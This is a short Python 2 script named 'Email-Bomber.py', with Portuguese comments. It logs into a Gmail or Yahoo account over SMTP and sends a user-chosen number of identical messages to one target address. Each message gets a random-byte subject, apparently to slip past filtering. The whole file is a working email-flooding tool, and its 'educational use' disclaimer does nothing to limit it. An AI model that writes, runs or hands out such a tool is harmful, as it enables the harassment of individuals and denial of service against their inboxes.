#!/usr/bin/python
#Email-Bomber.py by Grilo
#Este codigo foi feito para uso educacional.
#O criador não se responsabiliza por quaisquer danos que este codigo venha a causar !!!

import os
import smtplib
import getpass
import sys


server = raw_input ('Server Mail: ')
user = raw_input('Utilizador: ')
passwd = getpass.getpass('Password: ')


to = raw_input('\nTo: ')
#subject = raw_input('Subject: ')
body = raw_input('Message: ')
total = input('Number of send: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Só funciona com gmail ou yahoo!'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rTotal emails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Feito !!!'
except KeyboardInterrupt:
    print '[-] Cancelado'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] O utilizador ou a password estão incorretas.'
sys.exit()
